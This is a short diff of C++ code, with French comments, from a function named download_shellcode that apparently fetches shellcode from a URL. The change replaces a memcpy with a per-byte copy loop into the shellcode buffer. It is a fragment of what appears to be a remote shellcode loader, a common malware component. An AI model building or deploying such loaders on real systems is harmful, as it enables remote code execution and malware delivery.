@@ -96,7 +96,9 @@ bool download_shellcode(const char* url, char** shellcode, size_t* size) {
 
         // Allouer et copier les données dans le shellcode
         *shellcode = new char[totalBytesRead];
-        memcpy(*shellcode, buffer.data(), totalBytesRead);
+        for (size_t i = 0; i < totalBytesRead; ++i) {
+            (*shellcode)[i] = buffer[i]; // Copy each byte individually
+        }
         *size = totalBytesRead;
 
         // Afficher le shellcode téléchargé (en hexadécimal)
